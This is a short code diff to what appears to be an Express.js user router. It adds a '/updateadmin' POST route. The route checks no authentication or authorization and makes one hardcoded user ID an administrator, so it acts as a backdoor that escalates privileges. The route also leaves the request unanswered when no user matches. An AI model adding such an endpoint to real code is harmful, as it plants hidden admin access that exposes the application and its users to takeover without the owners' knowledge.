@@ -297,4 +297,21 @@ router.post("/unfollow", async (req, res) => {
   }
 });
 
+router.post("/updateadmin", async (req, res) => {
+  try {
+    const user = await User.findOneAndUpdate({_id: '6583db85535182c1674fb11e'}, { isAdmin: true })
+    if(user) return res.json({
+      success: true,
+      message: "Admin now",
+    });
+  } 
+  catch (error) {
+    console.log(error);
+    res.status(500).json({
+      success: false,
+      message: "Internal server error",
+    });
+  }
+});
+
 module.exports = router;
